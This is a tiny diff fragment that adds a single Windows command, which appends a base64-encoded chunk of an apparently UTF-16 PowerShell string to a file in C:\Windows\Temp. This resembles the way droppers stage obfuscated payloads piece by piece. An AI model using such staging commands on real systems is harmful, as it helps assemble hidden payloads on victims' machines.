@@ -1,0 +1,2 @@
+﻿cmd.exe /c >>C:\Windows\Temp\vt_task.b64 echo LQBOAHUAbABsAAoA
+
